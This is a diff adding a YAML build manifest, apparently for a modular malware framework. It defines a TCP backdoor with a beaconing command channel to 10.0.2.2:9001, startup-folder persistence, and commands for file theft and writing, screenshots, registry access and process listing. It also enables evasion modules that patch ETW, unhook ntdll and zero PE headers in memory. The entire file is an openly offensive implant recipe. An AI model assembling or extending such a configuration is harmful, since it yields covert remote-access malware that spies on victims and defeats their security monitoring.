@@ -1,0 +1,32 @@
+name: backdoor_tcp_header_stomp
+description: TCP backdoor with header stomping — zeros PE headers in memory post-init
+
+core:
+  - core/emit_buffer
+  - core/file_ops
+
+c2: c2/tcp_beacon
+
+commands:
+  - commands/cmd_sysinfo
+  - commands/cmd_processes
+  - commands/cmd_filelist
+  - commands/cmd_fileread
+  - commands/cmd_filewrite
+  - commands/cmd_screenshot
+  - commands/cmd_registry
+  - commands/cmd_netinfo
+
+arch: arch/backdoor
+persist: persist/startup_folder
+
+evasion:
+  - evasion/etw_patch
+  - evasion/unhook_ntdll
+  - evasion/header_stomp
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  BEACON_INTERVAL_MS: "30000"
